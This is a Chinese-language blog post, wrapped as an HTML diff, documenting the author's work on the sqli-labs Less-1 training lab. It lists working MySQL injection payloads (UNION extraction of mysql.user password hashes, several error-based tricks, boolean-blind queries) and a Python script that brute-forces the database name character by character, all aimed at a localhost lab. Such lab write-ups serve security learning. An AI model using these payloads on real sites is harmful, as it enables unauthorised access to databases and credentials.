@@ -1,0 +1,334 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>sqli-labs-Less-1 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="网上关于这个的比较多，第一节课程是单引号注入，一般讲的都比较简单，加一个单引号闭合就行了，但是怎么注入数据呐。因为刚刚开始学，所以我翻了下源代码和数据库，注入出来的payload是这样的：2&amp;#39; union select group_concat(id,user()),group_concat(username,@@version),group_concat(password, (select hex(password) from mysql.user limit 1)) from users where id=3 order by id desc -- -
+简化一下语句是这样的select * from users where id=2 union select 1,2,3,mid((select password from mysql.user limit 1),N,1) order by id
+union前后的字段数必须一样，union后面的数据可以自己发挥，如何让页面显示注入之后数据可以使用 order by，因为php语句是只显示sql里面第一行结果，所以要让我们注入出来的在第一行显示。 
+Error based
+首先报错注入要注意闭合语句，比如id=1，如果在PHP里面是这样的select * from users where id=&amp;#39;$id&amp;#39;，其中变量是被单引号包围，在使用报错注入的时候一定要闭合单引号,同理其他符号也是。
+
+BIGINT溢出错误上面是union的注入情况，然后是报错注入如下：select * from users where id=1 and !(select*from(select user())x)+~0地址栏输入这样的语句2&amp;#39; and !(select*from(select+user())x)%2b~0(注意单引号闭合，如果没有闭合还是出现正常的结果。
+本文的攻击之所以得逞，是因为mysql_error()会向我们返回错误消息，只要这样，我们才能够利用它来进行注入。 这一功能，是在5.5.5及其以上版本提供的。
+
+source:http://drops.wooyun.org/web/8024
+EXP溢出错误"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="sqli-labs-Less-1"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> sqli-labs-Less-1</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>  网上关于这个的比较多，第一节课程是单引号注入，一般讲的都比较简单，加一个单引号闭合就行了，但是怎么注入数据呐。因为刚刚开始学，所以我翻了下源代码和数据库，注入出来的payload是这样的：<br><code>2&#39; union select group_concat(id,user()),group_concat(username,@@version),group_concat(password, (select hex(password) from mysql.user limit 1)) from users where id=3 order by id desc -- -</code></p>
+<p>简化一下语句是这样的select * from users where id=2 union select 1,2,3,mid((select password from mysql.user limit 1),N,1) order by id</p>
+<p>union前后的字段数必须一样，union后面的数据可以自己发挥，如何让页面显示注入之后数据可以使用 order by，因为php语句是只显示sql里面第一行结果，所以要让我们注入出来的在第一行显示。 </p>
+<h2 id="Error-based"><a href="#Error-based" class="headerlink" title="Error based"></a>Error based</h2><blockquote>
+<p>首先报错注入要注意闭合语句，比如<code>id=1</code>，如果在PHP里面是这样的<code>select * from users where id=&#39;$id&#39;</code>，其中变量是被单引号包围，在使用报错注入的时候一定要闭合单引号,同理其他符号也是。</p>
+</blockquote>
+<h3 id="BIGINT溢出错误"><a href="#BIGINT溢出错误" class="headerlink" title="BIGINT溢出错误"></a>BIGINT溢出错误</h3><p>上面是union的注入情况，然后是报错注入如下：<br><code>select * from users where id=1 and !(select*from(select user())x)+~0</code><br>地址栏输入这样的语句<br><code>2&#39; and !(select*from(select+user())x)%2b~0</code>(注意单引号闭合，如果没有闭合还是出现正常的结果。</p>
+<pre><code>本文的攻击之所以得逞，是因为mysql_error()会向我们返回错误消息，只要这样，我们才能够利用它来进行注入。 这一功能，是在5.5.5及其以上版本提供的。
+</code></pre>
+<p>source:<a target="_blank" rel="noopener" href="http://drops.wooyun.org/web/8024">http://drops.wooyun.org/web/8024</a></p>
+<h3 id="EXP溢出错误"><a href="#EXP溢出错误" class="headerlink" title="EXP溢出错误"></a>EXP溢出错误</h3><p><code>http://127.0.0.1:8080/sqli-labs/Less-1/?id=2%27%20and%20exp%28~%28select*from%28select%20user%28%29%29x%29%29%20--%20-</code><br>和上面类似。<br>source:<a target="_blank" rel="noopener" href="http://drops.wooyun.org/tips/8166">http://drops.wooyun.org/tips/8166</a></p>
+<p>另外有group by和count冲突，updatexml报错等</p>
+<h3 id="Duplicate-entry-…-’-for-key-‘group-key’"><a href="#Duplicate-entry-…-’-for-key-‘group-key’" class="headerlink" title="Duplicate entry …..’ for key ‘group_key’"></a>Duplicate entry …..’ for key ‘group_key’</h3><p>错误比较经典，地址栏的输入poyload如下：<br><code>and (select 29 from(select count(*),concat(floor(rand(0)*2),user())x from users group by x)a)</code><br>技巧的话就是把<code>floor(rand(0)*2)</code>使用concat把想要爆出的数据连接在一起为某个伪字段，然后<code>group by</code>。<br>报错需要<code>count(*)，rand()、group by</code>，三者缺一不可.具体的原因嘛看下面三个：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://rickgray.me/2014/11/16/error-based-sql-injection.html">http://rickgray.me/2014/11/16/error-based-sql-injection.html</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry/">http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry/</a></li>
+<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/tips/14312">http://drops.wooyun.org/tips/14312</a></li>
+</ul>
+<p>###extractivalue<br>payload: <code>AND (extractvalue(1,concat(0x7e,(select user()))))</code></p>
+<p>###updatexml<br>payload: <code>and (updatexml (1,concat(0x7e,(select user()),0x73),1))</code></p>
+<p>###GeometryCollection<br>payload: <code>and GeometryCollection((select * from(select * from(select user())a)b))</code></p>
+<p>其他几个好像不经常见，看原网页的记录吧：<br><a target="_blank" rel="noopener" href="http://c-chicken.cc/hacking/2016/01/03/Mysql-Error-Sqlinjection.html">http://c-chicken.cc/hacking/2016/01/03/Mysql-Error-Sqlinjection.html</a></p>
+<h2 id="Bool-blind"><a href="#Bool-blind" class="headerlink" title="Bool blind"></a>Bool blind</h2><p>布尔盲注</p>
+<p><code>http://127.0.0.1:8080/sqli-labs/Less-1/?id=2%27%20and%20mid%28%28select%20@@version%29,1,1%29=6%20%20--%20-</code><br>手工参考：<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-017425">http://www.wooyun.org/bugs/wooyun-2010-017425</a><br>判断长度:<code>And (select length(user()))=12</code><br>判断字符:<code>And (select ASCII(SUBSTR(user(),7,1)))&gt;99</code><br>这种可以写个脚本：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token comment"># coding:utf-8</span>
+
+<span class="token keyword">import</span> time
+<span class="token keyword">import</span> string
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> random
+<span class="token keyword">import</span> requests
+
+headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
+           <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Googlebot/2.1 (+http://www.googlebot.com/bot.html)'</span><span class="token punctuation">&#125;</span>
+
+payloads <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789@_.'</span>
+<span class="token keyword">print</span> <span class="token string">'[%s] Start to retrive MySQL User:'</span> <span class="token operator">%</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%H:%M:%S'</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+user <span class="token operator">=</span> <span class="token string">''</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>
+        s <span class="token operator">=</span> <span class="token string">'ascii(mid(database(),%s,1))=%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://127.0.0.1:8080/sqli-labs/Less-1/?id=2 and%20'</span> <span class="token operator">+</span> s<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">49639</span><span class="token punctuation">:</span>
+            user <span class="token operator">+=</span> payload
+            <span class="token keyword">print</span> <span class="token string">'\n[Scan in progress]'</span> <span class="token operator">+</span> user
+            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span> <span class="token string">'.'</span><span class="token punctuation">,</span>
+            <span class="token keyword">print</span> <span class="token string">'http://127.0.0.1:8080/sqli-labs/Less-1/?id=2 and%20'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'\n'</span>
+            <span class="token keyword">print</span> <span class="token builtin">len</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span>
+            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token string">'\n[Done]MySQL user is '</span> <span class="token operator">+</span> user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>判断那里可以写返回的文本长度或者<code>r.content.find(&#39;something&#39;)&gt;0</code></p>
+<p>根据sqlmap跑出来的payload，还有一种时间盲注可以查询数据，这种暂时还不会。<br>这是sqli-labs的第一节课，网上找到两个布尔盲注的，password没跑下来，不晓得什么个结果。</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2016/04/19/sqli-labs-less-1.html" class="leancloud-visitors view" data-flag-title="sqli-labs-Less-1">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2016/05/05/sqli-labs-less-16.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2016/04/15/svn-scan.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2016-04-19 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/SQL/">SQL<span>7</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Error-based"><span class="toc-article-text">Error based</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#BIGINT%E6%BA%A2%E5%87%BA%E9%94%99%E8%AF%AF"><span class="toc-article-text">BIGINT溢出错误</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#EXP%E6%BA%A2%E5%87%BA%E9%94%99%E8%AF%AF"><span class="toc-article-text">EXP溢出错误</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Duplicate-entry-%E2%80%A6-%E2%80%99-for-key-%E2%80%98group-key%E2%80%99"><span class="toc-article-text">Duplicate entry …..’ for key ‘group_key’</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Bool-blind"><span class="toc-article-text">Bool blind</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
